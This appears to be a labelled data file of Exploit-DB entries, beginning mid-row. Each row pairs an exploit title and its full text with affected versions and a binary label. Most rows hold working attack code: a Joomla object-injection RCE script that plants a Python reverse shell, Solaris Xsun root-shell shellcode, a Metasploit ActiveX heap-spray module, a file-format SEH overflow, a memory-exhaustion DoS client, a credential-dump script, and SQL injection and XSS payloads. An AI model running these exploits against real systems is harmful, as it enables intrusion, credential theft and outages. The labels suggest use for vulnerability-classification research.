'<=', '2.6']",1
32272,Ovidentia 6.6.5 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/30735/info  Ovidentia is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Ovidentia 6.6.5 is vulnerable; other versions may also be affected.  http://www.example.com/[path]/index.php?tg=search&pat=abcdefgh&idx=find&navpos=0&navitem=&field=<script>alert(333.45)</script>,['6.6.5'],1
37004,"PHPCollab 2.5 - 'deletetopics.php' SQL Injection # Exploit Title: PHPCollab 2.5 - SQL Injection # Google Dork: filetype:php inurl:""/general/login.php?PHPSESSID="" # Date: 13/05/2015 # Exploit Author: Wad Deek # Vendor Homepage: http://www.phpcollab.com/ # Software Link: http://sourceforge.net/projects/phpcollab/files/final/2.5/ # Version: 2.5 +>2.5<+ --> /docs/changes.txt +>2.5<+ --> /docs/readme.txt # Tested on: Xampp on Windows7 ################################################################################### PoC = http://127.0.0.1/phpcollab/topics/deletetopics.php?project=%27 ################################################################################### #===================================================== require('mechanize') agent = Mechanize.new() agent.redirect_ok = false agent.verify_mode = OpenSSL::SSL::VERIFY_NONE #===================================================== begin html = agent.get(""http://127.0.0.1/phpcollab/topics/deletetopics.php?project=%27"") rescue else puts(html.body()) end #=====================================================",['2.5'],1
20743,"Solaris 2.x/7.0/8 - Xsun HOME Buffer Overflow // source: https://www.securityfocus.com/bid/2561/info  The X11 server that ships with Sun Microsystems' Solaris, Xsun, contains a locally exploitable buffer overflow vulnerability.  The condition is present when the value of the HOME environment variable is of excessive length (more than 1050 bytes long).  An attacker may exploit this vulnerability to execute arbitrary code with effective group 'root' privileges.   /***********************************/ Solaris 7 (x86) /usr/openwin/bin/Xsun HOME environment overflow  Proof of Concept Exploitation riley@eeye.com  Puts a Root shell on local port 1524 /***********************************/  #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #define BUFLEN  1041  /* seteuid/setuid/inetd shell */ char eyecode[] = ""\xeb\x51\x9a\x65\x65\x79\x65\x07\x90\xc3\x5e"" ""\x29\xc0\x89\x46\xab\x88\x46\xb0\x89\x46\x0c"" ""\x50\xb0\x8d\xe8\xe4\xff\xff\xff\x29\xc0\x50"" ""\xb0\x17\xe8\xda\xff\xff\xff\x29\xc0\x88\x46"" ""\x17\x88\x46\x1a\x88\x46\x78\x29\xc0\x50\x56"" ""\x8d\x5e\x10\x89\x1e\x53\x8d\x5e\x18\x89\x5e"" ""\x04\x8d\x5e\x1b\x89\x5e\x08\xb0\x3b\xe8\xb2"" ""\xff\xff\xff\x90\x90\xc3\xe8\xb2\xff\xff\xff"" ""\x90\x6b\x61\x6d\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x2f\x62\x69\x6e\x2f\x73"" ""\x68\x20\x2d\x63\x20"" ""echo \""ingreslock stream tcp nowait root /bin/sh sh -i\"">/tmp/eeye;"" ""/usr/sbin/inetd -s /tmp/eeye2001"";  char buf[BUFLEN]; unsigned long int nop, esp; long int offset = 0;  unsigned long int get_esp() {__asm__(""movl %esp,%eax"");}  int main (int argc, char *argv[]) { 	int i; 	if (argc > 1) 		offset = strtol(argv[1], NULL, 0); 	else 		offset = -200; 	esp = get_esp(); 	memset(buf, 0x90, BUFLEN); 	memcpy(buf+800, eyecode, strlen(eyecode)); 	*((int *) &buf[1037]) = esp+offset; 	strncpy(&buf[0],""HOME="",5); 	putenv(buf); 	execl(""/usr/openwin/bin/Xsun"", ""eEye"", "":1"",NULL); 	return; }",['2.x/7.0/8'],1
39033,"Joomla! 1.5 < 3.4.5 - Object Injection 'x-forwarded-for' Header Remote Code Execution #!/usr/bin/env python  # Exploit Title: Joomla 1.5 - 3.4.5 Object Injection RCE X-Forwarded-For header # Date: 12/17/2015 # Exploit Author: original - Gary@ Sec-1 ltd, Modified - Andrew McNicol BreakPoint Labs (@0xcc_labs) # Vendor Homepage: https://www.joomla.org/ # Software Link: http://joomlacode.org/gf/project/joomla/frs/ # Version: Joomla 1.5 - 3.4.5 # Tested on: Ubuntu 14.04.2 LTS (Joomla! 3.2.1 Stable) # CVE : CVE-2015-8562   '''     Joomla 1.5 - 3.4.5 Object Injection RCE - CVE-2015-8562     PoC for CVE-2015-8562 to spawn a reverse shell or automate RCE      Original PoC from Gary@ Sec-1 ltd (http://www.sec-1.com):      https://www.exploit-db.com/exploits/38977/      Vulnerability Info, Exploit, Detection:     https://breakpoint-labs.com/joomla-rce-cve-2015-8562/      Exploit modified to use ""X-Forwarded-For"" header instead of ""User-Agent"" to avoid default logged to access.log      Usage - Automate Blind RCE:     python joomla-rce-2-shell.py -t http://192.168.1.139/ --cmd     $ touch /tmp/newhnewh          Usage - Spawn Reverse Shell using Pentestmonkey's Python one-liner and netcat listener on local host:     python joomla-rce-2-shell.py -t http://192.168.1.139/ -l 192.168.1.119 -p 4444     [-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://192.168.1.139/     [-] Uploading python reverse shell with LHOST:192.168.1.119 and LPORT:4444     <Response [200]>     [+] Spawning reverse shell....     <Response [200]>      Listening on [0.0.0.0] (family 0, port 4444)     $ python -c ""import pty;pty.spawn('/bin/bash')""     www-data@ubuntu:/$ id     uid=33(www-data) gid=33(www-data) groups=33(www-data)     www-data@ubuntu:/$   '''      import requests import subprocess import argparse import sys import base64   # Heavy lifting from PoC author Gary@ Sec-1 ltd (http://www.sec-1.com) def get_url(url, user_agent):       headers = {     'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', # Change default UA for Requests     'x-forwarded-for': user_agent   # X-Forwarded-For header instead of UA     }     cookies = requests.get(url,headers=headers).cookies     for _ in range(3):         response = requests.get(url, headers=headers,cookies=cookies)         return response   def php_str_noquotes(data):     ""Convert string to chr(xx).chr(xx) for use in php""     encoded = """"     for char in data:         encoded += ""chr({0})."".format(ord(char))       return encoded[:-1]    def generate_payload(php_payload):       php_payload = ""eval({0})"".format(php_str_noquotes(php_payload))       terminate = '\xf0\xfd\xfd\xfd';     exploit_template = r'''}__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""fc"";O:17:""JSimplepieFactory"":0:{}s:21:""\0\0\0disconnectHandlers"";a:1:{i:0;a:2:{i:0;O:9:""SimplePie"":5:{s:8:""sanitize"";O:20:""JDatabaseDriverMysql"":0:{}s:8:""feed_url"";'''     injected_payload = ""{};JFactory::getConfig();exit"".format(php_payload)         exploit_template += r'''s:{0}:""{1}""'''.format(str(len(injected_payload)), injected_payload)     exploit_template += r''';s:19:""cache_name_function"";s:6:""assert"";s:5:""cache"";b:1;s:11:""cache_class"";O:20:""JDatabaseDriverMysql"":0:{}}i:1;s:4:""init"";}}s:13:""\0\0\0connection"";b:1;}''' + terminate       return exploit_template   def main():     parser = argparse.ArgumentParser(prog='cve-2015-8562.py', description='Automate blind RCE for Joomla vuln CVE-2015-8652')     parser.add_argument('-t', dest='RHOST', required=True, help='Remote Target Joomla Server')     parser.add_argument('-l', dest='LHOST', help='specifiy local ip for reverse shell')     parser.add_argument('-p', dest='LPORT', help='specifiy local port for reverse shell')     parser.add_argument('--cmd', dest='cmd', action='store_true', help='drop into blind RCE')      args = parser.parse_args()      if args.cmd:         print ""[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}"".format(args.RHOST)         print ""[-] Dropping into shell-like environment to perform blind RCE""         while True:             command = raw_input('$ ')             cmd_str = ""system('{}');"".format(command)             pl = generate_payload(cmd_str)             print get_url(args.RHOST, pl)      # Spawn Reverse Shell using Netcat listener + Python shell on victim     elif args.LPORT and args.LPORT:         connection = ""'{}', {}"".format(args.LHOST, args.LPORT)          # pentestmonkey's Python reverse shell one-liner:         shell_str = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('''+connection+'''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'''         # Base64 encoded the Python reverse shell as some chars were messing up in the exploit         encoded_comm = base64.b64encode(shell_str)         # Stage 1 payload Str         payload = ""echo {} | base64 -d > /tmp/newhnewh.py"".format(encoded_comm)         print ""[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}"".format(args.RHOST)         print ""[-] Uploading python reverse shell with LHOST {} and {}"".format(args.LHOST, args.LPORT)         # Stage 1: Uploads the Python reverse shell to ""/tmp/newhnewh.py""         pl = generate_payload(""system('""+payload+""');"")         print get_url(args.RHOST, pl)         # Spawns Shell listener using netcat on LHOST         listener = subprocess.Popen(args=[""gnome-terminal"", ""--command=nc -lvp ""+args.LPORT])         print ""[+] Spawning reverse shell....""         # Stage 2: Executes Python reverse shell back to LHOST:LPORT         pl = generate_payload(""system('python /tmp/newhnewh.py');"")         print get_url(args.RHOST, pl)     else:         print '[!] missing arguments'         parser.print_help()   if __name__ == ""__main__"":     main()",['1.5 < 3.4.5'],1
18123,"Viscom Image Viewer CP Pro 8.0/Gold 6.0 - ActiveX Control (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::HttpServer::HTML  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Viscom Image Viewer CP Pro 8.0/Gold 6.0 ActiveX Control', 			'Description'    => %q{ 					This module exploits a stack based buffer overflow in the Active control file 				ImageViewer2.OCX by passing a overly long argument to an insecure TifMergeMultiFiles() 				method. Exploitation results in code execution with the privileges of the user who 				browsed to the exploit page.  				The victim will first be required to trust the publisher Viscom Software. 				This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7 				with Java support. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Dr_IDE', # Vulnerability discovery and original exploit 					'TecR0c', # Metasploit module 					'mr_me'   # Metasploit module 				], 			'Version'        => '$Revision: $', 			'References'     => 				[ 					[ 'URL', 'http://www.exploit-db.com/exploits/15668/' ], 					[ 'URL', 'http://secunia.com/advisories/42445/' ], 					[ 'URL', 'http://xforce.iss.net/xforce/xfdb/63666' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 					'DisablePayloadHandler' => 'false', 					'InitialAutoRunScript' => 'migrate -f' 				}, 			'Payload'        => 				{ 					'Space'         => 1024, 					'BadChars'      => ""\x00"" 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'Automatic', {} ], 					[ 'Windows XP IE6-7', {} ], 					[ 'Windows XP IE8, Windows Vista & Windows 7 + JAVA 6 (DEP & ASLR BYPASS)', {} ] 				], 			'DisclosureDate' => 'Mar 03 2010', 			'DefaultTarget'  => 0))  		register_options( 			[ OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true]) ], self.class) 	end  	# Prevent module from being executed in autopwn 	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def junk(n=4) 		return rand_text_alpha(n).unpack(""L"")[0].to_i 	end  	def on_request_uri(cli, request)  		# Set target manually or automatically 		my_target = target 		if my_target.name == 'Automatic' 			agent = request.headers['User-Agent'] 			if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/ 				my_target = targets[1] # XP 			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/ 				my_target = targets[1] # XP 			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8\.0/ 				my_target = targets[2] # XP 			elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7\.0/ 				my_target = targets[2] # Vista 			elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 8\.0/ 				my_target = targets[2] # Vista 			elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8\.0/ 				my_target = targets[2] # Win7 			end 		end  		sploit = rand_text_alpha(52) 		pivot = [0x12AE0FE4].pack(""V"") # Address to my code  		if my_target.name =~ /IE8/  			code = 			[ # MSVCR71.dll - rop chain generated with mona.py 				0x7C37653D, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN 				0xFFFFFDFF, # Value to negate, will become 0x00000201 (dwSize) 				0x7C347F98, # RETN (ROP NOP) 				0x7C3415A2, # JMP [EAX] 				0xFFFFFFFF, # 				0x7C376402, # Skip 4 bytes 				0x7C351E05, # NEG EAX # RETN 				0x7C345255, # INC EBX # FPATAN # RETN 				0x7C352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN 				0x7C344F87, # POP EDX # RETN 				0xFFFFFFC0, # Value to negate, will become 0x00000040 				0x7C351EB1, # NEG EDX # RETN 				0x7C34D201, # POP ECX # RETN 				0x7C38B001, # &Writable location 				0x7C347F97, # POP EAX # RETN 				0x7C37A151, # Ptr to &VirtualProtect() - 0x0EF 				0x7C378C81, # PUSHAD # ADD AL,0EF # RETN 				0x7C345C30, # Ptr to 'push esp # ret 			].pack(""V*"")  			code << payload.encoded 			sploit << [0x100EAD78].pack(""V"") # POP ESP # RETN [IMAGEV~1.OCX]  		else 			code = payload.encoded 			sploit << pivot 		end  		# Payload in JS format 		code = Rex::Text.to_unescape(code)  		sploit << [0x41414141].pack(""V"") # Filler 		sploit << [0x42424242].pack(""V"") # Filler 		sploit << [0x43434343].pack(""V"") # Filler 		sploit << pivot  		# Randomize the javascript variable names 		vname = rand_text_alpha(rand(100) + 1)  		spray = <<-JS 		var heap_lib = new heapLib.ie(0x20000); 		var code = unescape(""#{code}""); 		var nops = unescape(""%u0c0c%u0c0c"");  		while (nops.length < 0x2000) nops += nops; 		var offset = nops.substring(0, 0x800-0x20); 		var shellcode = offset + code + nops.substring(0, 0x2000-offset.length-code.length);  		while (shellcode.length < 0x40000) shellcode += shellcode; 		var block = shellcode.substring(0, (0x7fb00-6)/2);  		heap_lib.gc();  		for (var i = 0; i < 0x200; i++) { 		heap_lib.alloc(block); 		}  		var overflow = unescape(""#{sploit}""); 		var variable1 = ""VARIABLE"";  		#{vname}.TIFMergeMultiFiles(variable1,variable1,overflow); 		JS  		# Use heaplib 		js = heaplib(spray)  		# Obfuscate on demand 		if datastore['OBFUSCATE'] 			js = ::Rex::Exploitation::JSObfu.new(js) 			js.obfuscate 		end  		html = ""<html>"" 		html << ""\n<object classid='clsid:E589DA78-AD4C-4FC5-B6B9-9E47B110679E' id='#{vname}'></object>"" 		html << ""\n\t<script>#{js}\n\t</script>\n</html>""  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response_html(cli, html)  	end  end =begin (460.1d4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=0000fffd ebx=00000000 ecx=41414141 edx=6c440088 esi=00000010 edi=0204f5a8 eip=42424242 esp=0204f5b8 ebp=0204f644 iopl=0         nv up ei pl nz ac po nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212 41414141 ??              ???  0:005> dd @esp 0203f594  41414141 41414141 41414141 41414141 0203f5a4  41414141 41414141 41414141 41414141 =end",['8.0/Gold 6.0'],1
38704,"TECO JN5 L510-DriveLink 1.482 - '.lf5' Overwrite Buffer Overflow (SEH) #!/usr/bin/perl # # # TECO JN5 L510-DriveLink 1.482 SEH Overwrite Buffer Overflow Exploit # # # Vendor: TECO Electric and Machinery Co., Ltd. # Product web page: http://www.teco-group.eu # Download: http://globalsa.teco.com.tw/support_download.aspx?KindID=9 # Affected version: 1.482 and 1.462 # # Summary: JN5 DriveLink is a free program that enables you to # configure the AC Motor Drive, 510 Series PC-Link. It provides # support for sleep and fire modes favourable for pumps, fans, # compressors, and HVAC and communication network protocol of # Modbus/ BACnet/ Metasys N2. # # Desc: The vulnerability is caused due to a boundary error in the # processing of a project file, which can be exploited to cause a # buffer overflow when a user opens e.g. a specially crafted .LF5 file. # Successful exploitation could allow execution of arbitrary code on # the affected machine. # # --------------------------------------------------------------------------------- # (14c0.12ec): Access violation - code c0000005 (first chance) # First chance exceptions are reported before any exception handling. # This exception may be expected and handled. # *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\MFC42.DLL -  # *** WARNING: Unable to verify checksum for C:\Program Files (x86)\TECO\JN5 DriveLink\L510-DriveLink\L510-DriveLink.exe # *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files (x86)\TECO\JN5 DriveLink\L510-DriveLink\L510-DriveLink.exe # eax=000026a0 ebx=0018f430 ecx=41414141 edx=00000001 esi=0018f408 edi=ffffd961 # eip=70735d7e esp=0018f350 ebp=0018f364 iopl=0         nv up ei ng nz na po nc # cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210282 # MFC42!Ordinal2740+0xaa: # 70735d7e 8b01            mov     eax,dword ptr [ecx]  ds:002b:41414141=???????? # 0:000> !exchain # 0018f3e4: 41414141 # Invalid exception stack at 41414141 # --------------------------------------------------------------------------------- # # Tested on: Microsoft Windows 7 Professional SP1 (EN) 64bit #            Microsoft Windows 7 Ultimate SP1 (EN) 64bit # # # Vulnerability discovered by Gjoko 'LiquidWorm' Krstic #                             @zeroscience # # # Advisory ID: ZSL-2015-5279 # Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5279.php # # # 09.10.2015] #   my $header = ""\x04\x00\x00\x00\x0A\x00\x00\x00\x4C\x35\x31\x30\x2D\x31"".              ""\x50\x32\x2D\x48\x0E\x00\x00\x00\x14\x00\x00\x00\x01\x00"";  # 113 bytes MessageBox shellcode my $sc = ""\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"".          ""\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"".          ""\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"".          ""\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"".          ""\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"".          ""\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x65\x64"".          ""\x21\x01\x68\x20\x50\x77\x6e\x68\x20\x5a\x53\x4c\x89\xe1\xfe"".          ""\x49\x0b\x31\xc0\x51\x50\xff\xd7"";  my $buffer = ""A"" x 43 . ""\xEB\x06\x90\x90"" . ""\xB0\x5D\x40\x00"" . ""\x90"" x 16 . $sc . ""\x90"" x 20 . ""D"" x 2627;  my $file = ""Gaming Nerdz.lf5""; my $junk = $header.$buffer; open($FILE,"">$file""); print $FILE ""$junk""; close($FILE); print ""Malicious LF5 file created successfully!\n"";","['JN5', 'L510-DriveLink', '1.482']",1
22586,"EType EServ 2.98/2.99/3.0 - Resource Exhaustion (Denial of Service) (2) // source: https://www.securityfocus.com/bid/7552/info   A denial of service vulnerability has been reported for EServ. The vulnerability exists due to the way the server handles connections. Specifically, memory allocated for open connections are not properly freed when a connection no longer exists. This will result in a consumption of all available memory resources.   **It has been reported that EServ version 3.0 previously thought to be invulnerable to this issue is affected by this vulnerability. This version was tested on Windows 2000.   This vulnerability affects EServ 2.92 to 3.0.   /* m00-eServ-fun.c  *  *  EServ/2.95-3.00 remote memory-leak exploit  *  *  Result: exiting program and close all services  *  if you seen message: Broken pipe  *  then may going drink beer 8)  *  *  Eserv 3.0 only web(80) services susceptible on this DoS  *  *  rash / m00.void.ru  */  #include <stdio.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  int main(int argc, char *argv[]) {     char buf[2000];   int fd;   struct sockaddr_in rsin;    if (argc!=3) {    printf(""\n usage: %s <ip> <port>\n\n"", argv[0]);    exit(0);     }      rsin.sin_family = AF_INET;   rsin.sin_port   = htons(atoi(argv[2]));   rsin.sin_addr.s_addr = inet_addr(argv[1]);     for (fd=0;fd<2000;fd++)     buf[fd]=(int *)((rand()*10));      fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);                if (connect(fd,(struct sockaddr *)&rsin,sizeof(struct sockaddr))) perror(""[-] connect()""),exit(0);   printf(""[+] connected..\n"");    printf(""[+] send data to host..\n"");       while (1) {    if ((send(fd, buf, 2000, 0))<0)            break;     }    }",['2.98/2.99/3.0'],1
39175,"AssistMyTeam Team Helpdesk - Multiple Information Disclosure Vulnerabilities source: https://www.securityfocus.com/bid/67271/info  AssistMyTeam Team Helpdesk is prone to multiple information-disclosure vulnerabilities.  Successfully exploiting these issues may allow an attacker to obtain sensitive information that may aid in further attacks.  Team Helpdesk 8.3.5 is vulnerable; other versions may also be affected.   #!/usr/bin/python  import sys import re import os import subprocess  print ""This is an User Credential Dump for Team Helpdesk Customer Wev Service 8.3.5 (and prior) by bhamb.\n"" print ""Send any comment to ccb3b72@gmail.com\n""  if len(sys.argv) != 2: 	print('Usage: user_cred_dump.py https://Hostname.com') 	exit(1)  hostname=sys.argv[1]+""/cws/bin/cwacallers.xml"" print hostname subprocess.Popen(['wget', '--no-check-certificate',hostname]).communicate()  print ""The following usernames and encrypted password were found.\n"" cmd=""cat cwacallers.xml | grep '@' | cut -d'\""' -f4,6 | sed 's/\""/:/g' "" test=os.system(cmd)",['8.3.5'],1
19232,"SunOS 4.1.4 - arp(8c) Memory Dump source: https://www.securityfocus.com/bid/291/info  The version of arp(8c) which shipped with versions of SunOs 4.1.X could be used to dump system memory by using the -f flag. This flag causes the file filename to be read and multiple entries to be set in the ARP tables. However, in this instance because of poor permission sets on /dev/kmem a user can specify the file to be read as /dev/kmem and therefore gain a dump of currently paged system memory. This could lead to a root compromise.    $ arp -f /dev/kmem | strings > mem","['4.1.4', '4.1.X']",1
43470,"Microsoft Windows - 'nt!NtQueryInformationProcess (information class 76_ QueryProcessEnergyValues)' Kernel Stack Memory Disclosure /* We have discovered that the nt!NtQueryInformationProcess system call invoked with the 76 information class discloses portions of uninitialized kernel stack memory to user-mode clients. The specific information class is handled by an internal nt!PsQueryProcessEnergyValues function.  While we don't know the layout of the output structure, we have determined that on our test Windows 10 version 1709 32-bit system, the output size is 0x1B0 (432) bytes. Within the output buffer, four consecutive bytes at offsets 0x8c to 0x8f are not properly initialized and contain leftover data from the kernel stack.   The attached proof of concept code works by first filling a large portion of the kernel stack with a controlled marker byte 0x41 ('A') using the win32k!NtGdiEngCreatePalette system call, and then invokes the affected nt!NtQueryInformationProcess service. As a result, we can observe that these leftover bytes are indeed leaked to user-mode at offset 0x8c of the output structure:  --- cut --- 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 94 90 f8 01 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000110: b6 04 00 00 01 00 00 00 00 00 00 00 00 00 00 00 ................ 00000120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000130: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000150: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000170: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000001a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ --- cut ---  Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space. */  #include <Windows.h> #include <winternl.h> #include <cstdio>  // For native 32-bit execution. extern ""C"" ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {   __asm {mov eax, ApiNumber};   __asm {lea edx, ApiNumber + 4};   __asm {int 0x2e}; }  VOID PrintHex(PBYTE Data, ULONG dwBytes) {   for (ULONG i = 0; i < dwBytes; i += 16) {     printf(""%.8x: "", i);      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes) {         printf(""%.2x "", Data[i + j]);       }       else {         printf(""?? "");       }     }      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {         printf(""%c"", Data[i + j]);       }       else {         printf(""."");       }     }      printf(""\n"");   } }  VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {   for (ULONG i = 0; i < size; i++) {     ptr[i] = byte;   } }  VOID SprayKernelStack() {   // Windows 10 version 1709 32-bit.   CONST ULONG __NR_NtGdiEngCreatePalette = 0x1296;    // Buffer allocated in static program memory, hence doesn't touch the local stack.   static BYTE buffer[1024];    // Fill the buffer with 'A's and spray the kernel stack.   MyMemset(buffer, 'A', sizeof(buffer));   SystemCall32(__NR_NtGdiEngCreatePalette, 1, sizeof(buffer) / sizeof(DWORD), buffer, 0, 0, 0);    // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.   MyMemset(buffer, 'B', sizeof(buffer)); }  int main() {   // Initialize the thread as GUI.   LoadLibrary(L""user32.dll"");    // Spray the kernel stack to get visible results of the memory disclosure.   SprayKernelStack();    // Trigger the bug and display the output.   BYTE OutputBuffer[0x1b0] = { /* zero padding */ };   ULONG ReturnLength;    NTSTATUS st = NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)76, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);   if (!NT_SUCCESS(st)) {     printf(""NtQueryInformationProcess failed, %x\n"", st);     return 1;   }    PrintHex(OutputBuffer, sizeof(OutputBuffer));    return 0; }",['10'],1
47753,Microsoft Windows - Multiple UAC Protection Bypasses Windows 10 UAC bypass for all executable files which are autoelevate true.  https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html  Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47753.zip,['10'],1
41838,"My Gaming Ladder Combo System 7.5 - SQL Injection # # # # # # Exploit Title: My Gaming Ladder Combo System 7.5 - SQL Injection # Google Dork: N/A # Date: 07.04.2017 # Vendor Homepage: http://www.mygamingladder.com/ # Software: http://www.mygamingladder.com/demos.shtml # Demo: http://www.mygamingladder.com/upgrade/combo/ # Version: 7.5 # Tested on: Win7 x64, Kali Linux x64 # # # # # # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # #ihsansencan # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/game.php?gameid=[SQL] # http://localhost/[PATH]/news.php?newsid=[SQL] # http://localhost/[PATH]/teams.php?teamid=[SQL] # http://localhost/[PATH]/match.php?matchid=[SQL] # staff # staffaccess # staffcomments # teammembers # teammembersinv # teams # # # # #",['7.5'],1
,,,
9554,"Apple iPhone 2.2.1/3.x - MobileSafari Crash + Reboot (Denial of Service) # Apple iPhone (MobileSafari) Crash & Reboot # TheLeader, GSOG [st0p] hotmail [sp4m] com # Shoutz: hacking.org.il nullbyte.org.il  # Tested on iPod Touch 2G, OS 2.2.1 # Launch MobileSafari, enter the page and MobileSafari will freeze. # Wait for 4-5 minutes and the device will spontaneously reboot.  # Exploit:  <html> <body> <script> var a = ''; for (var i = 1; i <= 500000; i++) {   a += '\n'; } alert(a); </script> </body> </html>  # milw0rm.com [2009-08-31]","['2.2.1/3.x', '2.2.1']",0
27993,"FreeType - '.TTF' File Remote Denial of Service source: https://www.securityfocus.com/bid/18329/info  FreeType is prone to a denial-of-service vulnerability. This issue is due to a flaw in the library that causes a NULL-pointer dereference.  This issue allows remote attackers to crash applications that use the affected library, denying service to legitimate users.  FreeType versions prior to 2.2.1 are vulnerable to this issue.  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/27993.zip",['prior to 2.2.1'],1
